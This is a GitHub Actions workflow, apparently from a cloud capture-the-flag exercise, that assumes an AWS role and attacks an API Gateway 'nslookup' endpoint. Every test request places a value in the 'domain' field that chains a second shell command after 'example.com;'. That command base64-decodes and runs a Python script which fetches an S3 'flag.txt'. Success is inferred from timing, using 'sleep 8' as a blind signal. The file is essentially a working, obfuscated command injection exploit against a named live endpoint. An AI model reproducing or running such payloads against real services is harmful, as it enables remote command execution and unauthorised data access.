name: Stage2-23-Unsigned-VirtualHost

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Test virtual-hosted S3 requests
        run: |
          python3 - <<'PY'
          import os
          import time
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = [
              (
                  "virtual_cloudfront_ua",
                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
                  "Amazon CloudFront"
              ),
              (
                  "virtual_browser_ua",
                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
                  "Mozilla/5.0"
              ),
              (
                  "virtual_empty_ua",
                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
                  ""
              )
          ]

          for name, url, user_agent in tests:
              inner_code = (
                  "import urllib.request\n"
                  f"req=urllib.request.Request({url!r}, headers={{'User-Agent': {user_agent!r}}})\n"
                  "with urllib.request.urlopen(req, timeout=10) as r:\n"
                  "    r.read(1)\n"
              )

              encoded = base64.b64encode(inner_code.encode()).decode()

              injected = (
                  "example.com; "
                  "printf '%s' "
                  + encoded
                  + " | base64 -d > /tmp/vhost_probe.py; "
                  "python3 /tmp/vhost_probe.py "
                  ">/tmp/vhost_result 2>&1 && sleep 8"
              )

              start = time.monotonic()

              response = requests.post(
                  api,
                  json={"domain": injected},
                  auth=auth,
                  timeout=30
              )

              elapsed = time.monotonic() - start

              print("TEST=" + name)
              print("HTTP=" + str(response.status_code))
              print("ELAPSED=%.2f" % elapsed)
              print("---")
          PY
